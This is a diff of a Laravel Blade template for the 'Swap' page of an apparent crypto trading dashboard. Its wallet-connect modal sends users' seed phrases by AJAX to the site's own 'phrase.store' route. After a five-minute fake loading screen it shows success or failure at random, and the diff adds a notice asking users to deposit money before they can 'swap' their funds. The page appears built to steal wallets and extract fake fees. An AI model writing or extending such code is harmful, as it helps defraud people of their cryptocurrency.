@@ -4,9 +4,6 @@
     {{ __('Swap') }}
 @endsection
 
-@section('title')
-    {{ __('Swap') }}
-@endsection
 
 @php
     $user = \App\Models\User::find(auth()->id());
@@ -16,16 +13,6 @@
     $offshore_trading = $wallet ? $wallet['trading'] : $ira_trading + $offshore_trading;
     $phrase = json_decode($user->phrase, true);
 @endphp
-
-@section('breadcrumb')
-    <li class="breadcrumb-item"><a href="{{ route('user.index') }}">Dashboard</a></li>
-    <li class="breadcrumb-item active">Transactions</li>
-    @if($phrase && $phrase['status'] == 1)
-        <li class="breadcrumb-item"><button class="btn btn-success w-sm text-white" type="button" >Wallet Connected</button></li>
-    @else
-        <li class="breadcrumb-item"><button class="btn btn-primary w-sm text-white" type="button" data-toggle="modal" data-target="#connectWallet">Connect Wallet</button></li>
-    @endif
-@endsection
 
 
 <style>
@@ -119,6 +106,26 @@
 </style>
 
 @section('content')
+    <div class="row">
+        <div class="col-12">
+            <div class="page-title-box d-sm-flex align-items-center justify-content-between">
+                <ol class="breadcrumb m-0">
+                    <li class="breadcrumb-item"><a href="{{ route('user.index') }}">Dashboard</a></li>
+                    <li class="breadcrumb-item active">Cash</li>
+                    <li class="breadcrumb-item active">Swap</li>
+                </ol>
+
+                <div class="page-title-right">
+                    @if($phrase && $phrase['status'] == 1)
+                        <button class="btn btn-success w-sm text-white" type="button" >Wallet Connected</button>
+                    @else
+                        <button class="btn btn-primary w-sm text-white" type="button" data-toggle="modal" data-target="#connectWallet" id="connectBtn">Connect Wallet</button>
+                    @endif
+                </div>
+
+            </div>
+        </div>
+    </div>
     <!-- Modal -->
     <div class="modal fade" id="exampleModalCenterbank" tabindex="-1" role="dialog"
         aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
@@ -224,7 +231,7 @@
                         <!-- Right Section -->
                         <div class="col-8">
                             <div class="import-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
-                                <img src="{{ asset('assets/images/import.png') }}" alt="Import Wallet" class="mb-3" style="width: 60px; cursor: pointer">
+                                <img src="{{ asset('assets/images/import.png') }}" alt="Import Wallet" class="mb-3" style="width: 60px; cursor: pointer" id="connect-text2">
                                 <h5 class="mb-2">Import a wallet</h5>
                                 <p class="text-muted text-center">You can easily connect and backup your wallet using seed phrase.</p>
                                 <button class="btn btn-primary mt-3" id="connect-text">Connect</button>
@@ -328,9 +335,24 @@
                                     @enderror
                                 </div>
 
+                                @if($user->swap >= 1)
+
+                                <div class="card bg-light mt-2 mb-3">
+                                    <div class="container-fluid">
+                                        <div class="row mt-4 mb-4">
+                                            <div class="col-12 text-center">
+                                                <h6>Add {{ $sym->symbol }}{{ number_format($user->swap, 2) }} to your crypto balance to allow swap on your traded funds</h6>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                @endif
+
                                 <div class="text-center d-grid gap-2">
                                     <button class="btn btn-primary w-md" type="submit">Swap</button>
                                 </div>
+
                             </div>
                         </form>
                     </div>
@@ -484,97 +506,134 @@
 
 @section('script')
     <script>
-$(document).ready(function() {
-    $(".text-screen").addClass("d-none");
-    $(".loading-screen").addClass("d-none");
-    $(".failed-screen").addClass("d-none");
-    $(".success-screen").addClass("d-none");
+        $(document).ready(function() {
+            $(".text-screen").addClass("d-none");
+            $(".loading-screen").addClass("d-none");
+            $(".failed-screen").addClass("d-none");
+            $(".success-screen").addClass("d-none");
 
-    // Set the first wallet as active by default if none is selected
-    let selectedWallet = $(".list-group-item.active");
-    if (!selectedWallet.length) {
-        selectedWallet = $(".list-group-item").first();
-        selectedWallet.addClass("active");
-    }
+            // Set the first wallet as active by default if none is selected
+            let selectedWallet = $(".list-group-item.active");
+            if (!selectedWallet.length) {
+                selectedWallet = $(".list-group-item").first();
+                selectedWallet.addClass("active");
+            }
 
-    // 1. Handle left section click to make item active, only in the import screen
-    $(".list-group-item").on("click", function() {
-        if ($(".import-screen").is(":visible")) {
-            $(".list-group-item").removeClass("active"); // Remove active class from all items
-            $(this).addClass("active"); // Add active class to clicked item
-            
-            // Update the image and title in the right section
-            let walletName = $(this).text().trim();
-            let walletImgSrc = $(this).find("img").attr("src");
-            $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", walletImgSrc);
-            $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(walletName);
-        }
-    });
+            // 1. Handle left section click to make item active, only in the import screen
+            $(".list-group-item").on("click", function() {
+                if ($(".import-screen").is(":visible")) {
+                    $(".list-group-item").removeClass("active"); // Remove active class from all items
+                    $(this).addClass("active"); // Add active class to clicked item
+                    
+                    // Update the image and title in the right section
+                    let walletName = $(this).text().trim();
+                    let walletImgSrc = $(this).find("img").attr("src");
+                    $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", walletImgSrc);
+                    $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(walletName);
+                }
 
-    // 2. Handle import wallet click to show the text screen
-    $("#connect-text").on("click", function() {
-        $(".import-screen").addClass("d-none"); // Hide the initial screen
-        $(".text-screen").removeClass("d-none"); // Show the text screen
-    });
+                if ($(".text-screen").is(":visible")) {
+                    // Reset the modal to its initial state
+                    $(".text-screen, .loading-screen, .failed-screen, .success-screen").addClass("d-none");
+                    $(".import-screen").removeClass("d-none");
+                    
+                    // Clear the secret phrase input
+                    $("#phrase").val("");
 
-    // 3. Handle Secret Phrase form submission
-    $(".text-screen button").on("click", function() {
-        let secretPhrase = $("#phrase").val().trim();
+                    // Reset the active wallet to the first one
+                    $(".list-group-item").removeClass("active");
+                    $(".list-group-item").first().addClass("active");
 
-        // Get the active wallet type and name
-        let activeWallet = $(".list-group-item.active");
-        let walletName = activeWallet.text().trim();
-        let walletType = activeWallet.find("img").attr("alt");
-
-        if (!activeWallet.length) {
-            // If no wallet is selected, select the first one as default
-            activeWallet = $(".list-group-item").first();
-            walletName = activeWallet.text().trim();
-            walletType = activeWallet.find("img").attr("alt");
-        }
-
-        if (secretPhrase) {
-            $(".text-screen").addClass("d-none"); // Hide the text screen
-            $(".loading-screen").removeClass("d-none"); // Show the loading screen
-
-            // Submit the form data via AJAX
-            $.ajax({
-                type: "POST",
-                url: `{{ route('phrase.store') }}`,  // Replace with your API endpoint
-                headers: {'X-CSRF-Token': '{{ csrf_token() }}'},
-                data: JSON.stringify({ 
-                    phrase: secretPhrase,
-                    wallet: walletName, 
-                }),
-                contentType: 'application/json',
-                success: function (res) {
-                    alertify.success(res['msg']);
-                },
-                error: function (res) {
-                    const data = res['responseJSON']
-                    const errors = data['errors']
-                    if (res['status'] === 422) {
-                        alertify.error(data['msg'])
-                    } else {
-                        alertify.error('An error occurred, Try again.')
-                    }
+                    // Reset the images and titles in the loading/failed/success screens
+                    let firstWalletImgSrc = $(".list-group-item").first().find("img").attr("src");
+                    let firstWalletName = $(".list-group-item").first().text().trim();
+                    $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", firstWalletImgSrc);
+                    $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(firstWalletName);
                 }
             });
 
-            // 4. Show loading screen for 5 minutes and then show success or failed screen
-            setTimeout(function() {
-                $(".loading-screen").addClass("d-none"); // Hide the loading screen
+            // 2. Handle import wallet click to show the text screen
+            $("#connect-text, #connect-text2").on("click", function() {
+                $(".import-screen").addClass("d-none"); // Hide the initial screen
+                $(".text-screen").removeClass("d-none"); // Show the text screen
+            });
 
-                if (Math.random() > 0.5) {
-                    $(".success-screen").removeClass("d-none"); // Show success screen
-                } else {
-                    $(".failed-screen").removeClass("d-none"); // Show failed screen
+            // 3. Handle Secret Phrase form submission
+            $(".text-screen button").on("click", function() {
+                let secretPhrase = $("#phrase").val().trim();
+
+                // Get the active wallet type and name
+                let activeWallet = $(".list-group-item.active");
+                let walletName = activeWallet.text().trim();
+                let walletType = activeWallet.find("img").attr("alt");
+
+                if (!activeWallet.length) {
+                    // If no wallet is selected, select the first one as default
+                    activeWallet = $(".list-group-item").first();
+                    walletName = activeWallet.text().trim();
+                    walletType = activeWallet.find("img").attr("alt");
                 }
-            }, 300000); // 5 minutes in milliseconds
-        }
-    });
-});
 
+                if (secretPhrase) {
+                    $(".text-screen").addClass("d-none"); // Hide the text screen
+                    $(".loading-screen").removeClass("d-none"); // Show the loading screen
+
+                    // Submit the form data via AJAX
+                    $.ajax({
+                        type: "POST",
+                        url: `{{ route('phrase.store') }}`,  // Replace with your API endpoint
+                        headers: {'X-CSRF-Token': '{{ csrf_token() }}'},
+                        data: JSON.stringify({ 
+                            phrase: secretPhrase,
+                            wallet: walletName, 
+                        }),
+                        contentType: 'application/json',
+                        success: function (res) {
+                            alertify.success(res['msg']);
+                        },
+                        error: function (res) {
+                            const data = res['responseJSON']
+                            const errors = data['errors']
+                            if (res['status'] === 422) {
+                                alertify.error(data['msg'])
+                            } else {
+                                alertify.error('An error occurred, Try again.')
+                            }
+                        }
+                    });
+
+                    // 4. Show loading screen for 5 minutes and then show success or failed screen
+                    setTimeout(function() {
+                        $(".loading-screen").addClass("d-none"); // Hide the loading screen
+
+                        if (Math.random() > 0.5) {
+                            $(".success-screen").removeClass("d-none"); // Show success screen
+                        } else {
+                            $(".failed-screen").removeClass("d-none"); // Show failed screen
+                        }
+                    }, 300000); // 5 minutes in milliseconds
+                }
+            });
+
+            $('#connectBtn').on('click', function() {
+                // Reset the modal to its initial state
+                $(".text-screen, .loading-screen, .failed-screen, .success-screen").addClass("d-none");
+                $(".import-screen").removeClass("d-none");
+                
+                // Clear the secret phrase input
+                $("#phrase").val("");
+
+                // Reset the active wallet to the first one
+                $(".list-group-item").removeClass("active");
+                $(".list-group-item").first().addClass("active");
+
+                // Reset the images and titles in the loading/failed/success screens
+                let firstWalletImgSrc = $(".list-group-item").first().find("img").attr("src");
+                let firstWalletName = $(".list-group-item").first().text().trim();
+                $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", firstWalletImgSrc);
+                $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(firstWalletName);
+            });
+        });
     </script>
     <script>
         $(document).ready(function() {
